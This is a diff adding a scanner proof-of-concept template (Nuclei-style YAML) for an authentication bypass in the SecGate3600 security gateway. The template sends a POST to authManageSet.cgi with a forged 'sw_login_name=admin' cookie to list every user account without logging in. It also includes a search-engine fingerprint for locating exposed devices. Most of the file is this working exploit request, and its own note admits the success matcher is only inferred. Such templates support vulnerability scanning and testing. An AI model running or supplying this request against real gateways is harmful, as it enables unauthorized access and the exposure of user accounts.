@@ -1,0 +1,32 @@
+id: poc-8b542c1b6462861715b4
+info:
+  name: 网神SecGata3600安全网关authManageSet.cgi接口登录绕过漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/8b542c1b6462861715b408bf705aac0c
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 8b542c1b6462861715b408bf705aac0c
+    fofa: + hunter`web.body="sec_gate_image/login_02.gif"`
+http:
+- raw:
+  - 'POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: sw_login_name=admin
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+
+    type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
